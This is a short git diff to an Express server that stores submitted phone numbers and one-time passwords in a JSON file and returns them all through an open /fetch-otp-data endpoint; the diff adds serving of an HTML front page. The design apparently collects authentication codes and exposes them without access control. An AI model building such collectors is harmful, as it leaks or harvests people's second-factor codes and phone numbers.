@@ -5,16 +5,17 @@ const path = require('path');
 const app = express();
 const otpDataFile = path.join(__dirname, 'otpData.json'); // Full path to the data file
 
+// Serve static HTML from 'public' folder
+app.use(express.static(path.join(__dirname, 'public')));
+
 // Endpoint to receive phone and OTP
 app.get('/', (req, res) => {
     const phone = req.query.phone;
     const otp = req.query.otp;
 
     if (!phone || !otp) {
-        return res.status(400).json({
-            message: 'Phone number and OTP are required',
-            status: 'error',
-        });
+        // Serve the HTML page if no query parameters are present
+        return res.sendFile(path.join(__dirname, 'public', 'index.html'));
     }
 
     // Load existing data from file
@@ -44,9 +45,6 @@ app.get('/fetch-otp-data', (req, res) => {
         : [];
     res.json(otpData);
 });
-
-// Serve static HTML from 'public' folder (optional)
-app.use(express.static(path.join(__dirname, 'public')));
 
 // Start the server
 const PORT = process.env.PORT || 3000;
